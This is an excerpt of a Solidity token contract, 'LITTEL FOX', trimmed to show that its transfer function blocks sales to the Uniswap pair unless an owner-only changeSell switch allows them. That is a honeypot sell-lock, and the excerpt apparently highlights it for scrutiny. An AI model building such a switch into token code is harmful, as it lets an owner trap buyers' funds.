...
contract LITTELFOX is Context, IERC20, Ownable {
    ...
    string private _name = "LITTEL FOX";
    ...
    uint256 private numTokensSellToAddToLiquidity = 10000 * 10**18; // 0.1%
    ...
    function _transfer(
        ...
        if(to == uniswapV2Pair){
            require(enableSell , "sell is disable");
        }
    ...
    function changeSell(bool _ex) external onlyOwner returns(bool){
        enableSell = _ex;
        return enableSell;
    }
